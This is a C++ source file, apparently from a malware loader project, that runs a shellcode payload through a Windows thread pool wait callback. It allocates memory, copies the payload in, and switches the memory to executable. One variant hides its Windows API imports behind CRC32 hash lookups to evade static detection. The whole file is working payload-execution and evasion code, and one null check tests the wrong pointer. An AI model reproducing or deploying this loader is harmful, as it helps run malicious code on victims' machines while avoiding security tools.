#include "Cloak.hpp"

#ifdef THREADPOOLWAIT

#ifdef HASH_API
#include "Hash.hpp"

BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateEventA pCreateEventA = ( fnCreateEventA ) GetProcAddressH( hKernel32, CreateEventA_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateEventA\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateThreadpoolWait pCreateThreadpoolWait = ( fnCreateThreadpoolWait ) GetProcAddressH( hKernel32, CreateThreadpoolWait_CRC32A );
    if ( pCreateThreadpoolWait == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThreadPoolWait\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // fnSetThreadpoolWait pSetThreadpoolWait = ( fnSetThreadpoolWait ) GetProcAddressH( hKernel32, SetThreadpoolWait_CRC32A );
    // if ( pSetThreadpoolWait == NULL ) {
    //     #ifdef DEBUG
    //     printf( "[-] Unable to get address for SetThreadPoolWait\n" );
    //     #endif // !DEBUG
        
    //     return FALSE;
    // }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    PVOID       pPayloadAddress     = NULL;
    HANDLE      hEvent              = NULL;
    DWORD       dwOldProtect        = NULL;
    PTP_WAIT    pThreadPoolWait     = NULL;

    hEvent = pCreateEventA( NULL, FALSE, TRUE, NULL );
    if ( hEvent == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateEventA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pThreadPoolWait = pCreateThreadpoolWait( ( PTP_WAIT_CALLBACK ) pPayloadAddress, NULL, NULL );
    SetThreadpoolWait( pThreadPoolWait, hEvent, NULL );
    pWaitForSingleObject( hEvent, WAIT_TIME );

    return TRUE;
}

#else

BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID       pPayloadAddress     = NULL;
    HANDLE      hEvent              = NULL;
    DWORD       dwOldProtect        = NULL;
    PTP_WAIT    pThreadPoolWait     = NULL;

    hEvent = CreateEventA( NULL, FALSE, TRUE, NULL );
    if ( hEvent == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateEventA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pThreadPoolWait = CreateThreadpoolWait( ( PTP_WAIT_CALLBACK ) pPayloadAddress, NULL, NULL );
    SetThreadpoolWait( pThreadPoolWait, hEvent, NULL );
    WaitForSingleObject( hEvent, WAIT_TIME );

    return TRUE;
}

#endif // !HASH_API

#endif // !THREADPOOLWAIT